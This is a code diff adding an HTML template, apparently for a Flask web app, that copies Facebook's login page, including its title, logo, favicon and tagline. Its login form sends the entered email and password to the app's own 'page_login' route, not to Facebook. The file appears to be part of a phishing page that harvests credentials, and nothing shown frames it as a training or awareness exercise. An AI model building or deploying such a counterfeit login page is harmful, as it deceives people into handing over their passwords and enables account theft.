@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='default.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='facebook.css') }}">
+    <link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='img/fb.ico') }}">
+</head>
+<body>
+    <div class="login">
+        <div class="container">
+            <div class="row">
+                <div class="col-7">
+                    <div class="align-center">
+                        <div class="content">
+                            <img src="{{ url_for('static', filename='img/fb.png') }}" alt="">
+                            <p>Facebook helps you connect and share with the people in your life.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-5 col-xs-12">
+                    
+                        <div class="login-form">
+                            <form action="{{url_for('page_login')}}"  method="post">
+                                <input id="email" type="text" name="email" placeholder="Email address or phone number"><br>
+                                <input id="pass" type="text" name="password" placeholder="Password"><br>
+                                <button id="login-btn">Log In</button><br>
+                                <a href="#">Forgotten password?</a><br>
+                                <button id="create-btn">Create New Account</button><br>
+                            </form>
+                        </div>
+                        <footer>
+                            <a href="#" 
+                            style="font-weight: bold;
+                            color: var(--black);
+                            text-decoration: none;">Create a Page</a> 
+                            for a celebrity, band or business.
+                        </footer>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
